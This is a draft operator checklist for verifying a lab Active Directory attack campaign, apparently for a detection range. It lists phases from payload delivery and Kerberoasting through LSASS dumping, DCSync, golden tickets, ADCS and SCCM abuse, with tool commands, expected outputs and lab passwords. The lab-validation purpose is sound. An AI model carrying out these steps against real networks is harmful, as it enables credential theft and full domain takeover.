# CADRE — Operator Verification Checklist (Main Spine + Branches A-D)

> **Status:** Draft for operator review.  
> **Purpose:** Provide a second-operator, manual checklist to verify the v3 campaign main spine and Branches A-D without trusting the validation report alone.  
> **Scope:** The 25-item enterprise campaign from `CADRE-v3-Architecture-Review-Draft-2026-08-23.md` Appendix A.  
> **How to use:** Run one phase at a time. Mark each row with PASS / FAIL / NOT-TESTED. A FAIL stops the chain; fix it before proceeding.  

---

## Pre-Flight (Run Once)

| # | Check | Command / Method | Expected Result |
|---|---|---|---|
| 1 | All required VMs powered on | `vagrant status` | Core 7 + ws01 + extensions for the phase are running. |
| 2 | Direct SSH to ws01 works | `ssh -i C:\Users\Ganro\.ssh\cadre-ws01-key analyst_t1@192.168.77.62 whoami` | Returns `child\analyst_t1`. |
| 3 | ws01 has `C:\Tools\ADTools` | `ssh ... "ls C:\Tools\ADTools"` | Directory exists with tools. |
| 4 | Defender/MDE soft-disabled on ws01 | `ssh ... "Get-MpComputerStatus"` | `RealTimeProtectionEnabled = False`, `TamperProtection = False`. |
| 5 | Lab log reset done (if not first run) | Run `20-lab-log-reset-verifyOnly.yml` | Logs cleared; no leftover telemetry. |
| 6 | Snapshot state clean | Confirm snapshot name | Target snapshot restored before this phase. |

---

## Phase 0.5 — Initial Access (ws01)

Run on ws01 as `analyst_t1`. Expected starting state: no creds; user must execute a payload from `provisioning:8081`.

| # | Attack | Expected Marker | Where to Check | Pass Criterion |
|---|---|---|---|---|
| 1 | H-01 Malicious LNK | `H-PAYLOAD\|executed as CHILD\analyst_t1\|WS01` | stdout / `C:\Windows\Temp\h-marker.txt` | Marker present after simulated click. |
| 2 | H-02 Malicious MSI | Same marker or `WT064-PROOF-*` | `msiexec` exits 0; marker file present | Deferred CA ran after `After=InstallFiles`. |
| 3 | H-04 HTML smuggling | Builder file `H-04-smuggle.html` contains `payload.exe` base64 | `C:\Tools\campaign-h\H-04-smuggle.html` size 5883B | Builder verified; browser detonation noted. |
| 4 | H-05 AutoIt3 | `H-PAYLOAD\|executed as CHILD\analyst_t1\|WS01` | stdout / marker file | AutoIt3.exe + au3 executed. |
| 5 | H-06 Malicious EXE | `H-PAYLOAD\|executed as CHILD\analyst_t1\|WS01` | stdout / marker file | `payload.exe` downloaded and ran. |

**Phase 0.5 complete when:** at least 4 of 5 vectors produce a marker, and `analyst_t1` has a usable user-context session.

---

## Phase 0 — Reconnaissance

| # | Attack | Expected Output | Where to Check | Pass Criterion |
|---|---|---|---|---|
| 6 | Kerberos user enum | `intern_blue`, `analyst_t1`, `svc_mssql` in output | stdout of `nmap` or `kerbrute` against dc02 | At least 3 expected usernames found. |
| 7 | AS-REP roastable check | `intern_blue` has `DONT_REQUIRE_PREAUTH` | `ldapsearch` or `nxc ldap` UAC check | UAC contains `0x400000`. |

---

## Phase 1 — AS-REP Roast

| # | Attack | Expected Output | Where to Check | Pass Criterion |
|---|---|---|---|---|
| 8 | AS-REP roast `intern_blue` | `$krb5asrep$23$intern_blue@...` in output | `Rubeus.exe asreproast` or `nxc ldap --asreproast` | Hash captured; can be loaded into hashcat `-m 18200`. |

---

## Phase 2 — Kerberoast via ACE#18

| # | Attack | Expected Output | Where to Check | Pass Criterion |
|---|---|---|---|---|
| 9 | ForceChangePassword bridge | `analyst_t2` password changed and restored | `intern_blue` → `analyst_t2` → reset → original restored | Password changed and restored successfully. |
| 10 | Kerberoast `svc_mssql` | `$krb5tgs$23$*svc_mssql$...` captured and cracked | `Rubeus.exe kerberoast` + `hashcat` | Hash cracked to `s3rv1c3_MSSQL!`. |

---

## Phase 3 — SQL Execution

| # | Attack | Expected Output | Where to Check | Pass Criterion |
|---|---|---|---|---|
| 11 | `analyst_t1` SQL auth to mbr01 | Login succeeds | `sqlcmd` or `nxc mssql` | `Login succeeded for user 'child\analyst_t1'`. |
| 12 | `EXECUTE AS LOGIN='sa'` | `xp_cmdshell` enabled and runs | `SELECT IS_SRVROLEMEMBER('sysadmin')` returns 1 | User is sysadmin; `xp_cmdshell` returns output. |
| 13 | GodPotato to SYSTEM | `nt authority\system` marker | `whoami` output / `wt043-marker.txt` | GodPotato runs as SYSTEM. |

---

## Phase 3.5 — Credential Access

| # | Attack | Expected Output | Where to Check | Pass Criterion |
|---|---|---|---|---|
| 14 | WinRS ws01 → mbr01 | Command runs on mbr01 | `winrs -r:mbr01 ... whoami` | Returns `child\analyst_t1`. |
| 15 | Winlogon plaintext extraction | `CADRE\analyst_cloud:Cl0ud_An@lyst!` | Registry or script output | Credential present. |
| 16 | LSASS dump via procdump | 62MB full dump | `C:\Tools\cadre-attack\lsass.dmp` | File size ~62MB. |
| 17 | Rubeus dump parses LSASS | Logon sessions + tickets listed | `Rubeus.exe dump` output | `analyst_cloud`, `MSSQL$SQLEXPRESS`, cross-domain tickets visible. |

---

## Phase 4 — BloodHound

| # | Attack | Expected Output | Where to Check | Pass Criterion |
|---|---|---|---|---|
| 18 | SharpHound ingest | ` BloodHound-*.zip` created | `C:\Tools\cadre-attack\BloodHound-*` | Zip created with computers, users, groups, ACLs. |
| 19 | BloodHound shows `mbr01$` unconstrained | Edge present | BloodHound GUI or JSON | `mbr01.child.cadre.local` has `TRUSTED_FOR_DELEGATION`. |

---

## Phase 5 — Lateral Movement / Coercion

| # | Attack | Expected Output | Where to Check | Pass Criterion |
|---|---|---|---|---|
| 20 | Rubeus monitor on mbr01 | Listener starts on hostname | `Rubeus.exe monitor /targetuser:DC02$ ...` | Process running; output file path set. |
| 21 | MS-RPRN PrinterBug | Suricata SID 1000050 fires | Suricata eve log or `monitor` | Alert for `ET SCAN PetitPotam/PrinterBug` or lab SID. |
| 22 | T102 `dc02$` TGT capture | TGT written to file | `C:\Tools\cadre-attack\dc02_tgs.txt` | File contains `doI...` base64 kirbi. |
| 23 | kirbi → ccache conversion | ccache usable by impacket | `kirbi2ccache.py` | File `dc02.ccache` created. |

**Fallback:** If T102 fails, run WT007 RBCD with `addcomputer` and `getST` S4U2Proxy → SYSTEM on mbr01.

---

## Phase 6 — DCSync

| # | Attack | Expected Output | Where to Check | Pass Criterion |
|---|---|---|---|---|
| 24 | DCSync child krbtgt | `child\krbtgt` NT + AES256 hashes | `secretsdump.py -k -no-pass child/dc02$@dc02.child.cadre.local` | Hash lines for `krbtgt:502` and `krbtgt:aes256-cts-hmac-sha1-96` present. |

---

## Phase 7 — Ticket Forgery

| # | Attack | Expected Output | Where to Check | Pass Criterion |
|---|---|---|---|---|
| 25 | Golden Ticket | `mimikatz.exe "kerberos::golden ..."` creates `.kirbi` and injects | `C:\Tools\cadre-attack\EA-aes.kirbi` | File created; PTT succeeds. |
| 26 | Cross-realm DCSync of root | `secretsdump.py` against dc01 with golden ticket | `secretsdump.py -k cadre.local/administrator@dc01.cadre.local` | Root krbtgt or hashes returned, or documented PAC quirk noted. |
| 27 | Silver Ticket for cifs/mbr01 | impacket `smbclient.py -k` lists mbr01 C$ | `C$` share listing with files | Explicit Kerberos SMB works. |

**Note:** Rubeus `golden` may fail silently; use mimikatz. Cross-realm DCSync may hit PAC quirk; root access covered by Branch A fallback.

---

## Phase 8 — Cross-Forest + SCCM

| # | Attack | Expected Output | Where to Check | Pass Criterion |
|---|---|---|---|---|
| 28 | Cross-forest Kerberoast `svc_sccm` | `$krb5tgs$23$*svc_sccm$...` from range.local | `Rubeus.exe kerberoast /domain:range.local` | Hash captured and cracked to `s3rv1c3_SCCM!`. |
| 29 | SCCM NAA extraction | `RANGE\svc_naa` and `N@A_s3rv1c3!` | `wt034-sccm-naa.ps1` output | Credential confirmed. |

**Branch C only if SCCM snapshot `sccm-done` is restored.**

| # | Attack | Expected Output | Where to Check | Pass Criterion |
|---|---|---|---|---|
| 30 | SCCM CMPivot | Live data from WS01 | `CMPivotResult` JSON | `DeviceID`, `SystemName` fields visible. |
| 31 | SCCM app deploy | `nt authority\system` marker on WS01 | `C:\Windows\Temp\wt038-system.txt` | File contains `nt authority\system`. |
| 32 | SCCM RunScript | `ScriptOutput: "nt authority\system"` | `ScriptResult` JSON | Arbitrary script ran as SYSTEM. |

---

## Branch A — ACL Abuse

| # | Attack | Expected Output | Where to Check | Pass Criterion |
|---|---|---|---|---|
| 33 | WT015 ForceChangePassword | `hunter_dfir` resets `chief_command` password | Script output; restored after | `chief_command` password changed and restored. |
| 34 | WT013 WriteDacl self-escalate | `hunter_dfir` gets GenericAll on Command-Cadre | `t013-exploit.ps1` output; ACL read-back | GenericAll present. |
| 35 | WT014 GenericWrite → Shadow Creds | KeyCredential added to `analyst_cloud` | `pyWhisker` / `Whisker.exe` output | Shadow credential works for PKINIT. |
| 36 | WT008 Shadow Creds on `dc01$` | NT hash recovered | `pyWhisker` + PKINIT | `dc01$` NT hash recovered. |
| 37 | WT023 GPO Abuse | ScheduledTasks.xml preference written | SYSVOL; `t023-exploit.ps1` | XML written and read back. |
| 38 | WT024 gMSA extraction | gMSA NT hash recovered | `t024-gmsa-extract.py` | SMB auth as `gmsaTools$` succeeds. |
| 39 | GPP stored password | `cpassword` decrypted to `s3rv1c3_Ld@p!` | `gpp-decrypt` or equivalent | SMB auth as `svc_ldap` succeeds. |
| 40 | WT025 AdminSDHolder persistence | Backdoor ACE persisted 60 minutes | `t025-exploit.ps1` | New ACE on protected objects. |

---

## Branch B — ADCS

**Only if ADCS snapshot `adcs-templates-done` is restored.**

| # | Attack | Expected Output | Where to Check | Pass Criterion |
|---|---|---|---|---|
| 41 | WT050 ESC1 | PKINIT TGT + UnPAC NT hash | `certipy req` + `certipy auth` | `administrator` NT hash recovered. |
| 42 | WT051 ESC3 | On-behalf-of cert for administrator | `certipy req -on-behalf-of` | Admin cert obtained. |
| 43 | WT053 UnPAC-the-Hash | NT hash from PKINIT TGT | `certipy auth` | `administrator` NT hash recovered. |

---

## Branch D — Linux Pivot

| # | Attack | Expected Output | Where to Check | Pass Criterion |
|---|---|---|---|---|
| 44 | WT044 MSSQL linked server recon | List of linux01 databases | `OPENQUERY(LINUX01, 'SELECT ...')` | Databases from linux01 returned. |
| 45 | WT046 MSSQL keytab extraction | `mssql.keytab` readable | `linux01:/etc/...` or `C$` | Keytab contents present. |
| 46 | WT047 NFS `sec=krb5p` mount | `MOUNT_OK` | `mount -t nfs4 -o sec=krb5p ...` | Mount succeeds; read allowed. |
| 47 | WT048 Podman container escape | `uid=0(root) gid=0(root)` | `sudo podman exec ... id` | Root inside container mapped to host root. |

---

## Final Sign-Off

| # | Check | Pass? |
|---|---|---|
| 48 | All 25 main-spine + branch items produce expected markers or outputs | |
| 49 | No attack required a provisioning bridge (Rule 1) | |
| 50 | No attack used a scheduled task as an execution wrapper (Rule 2) | |
| 51 | Telemetry was exported for each phase where sensors were online | |
| 52 | Notes taken on any FAIL or PARTIAL items for the validation report | |

**Operator:** ___________________  **Date:** ________________  **Lab snapshot used:** ___________________

---

*Draft prepared for review. Do not commit until approved.*
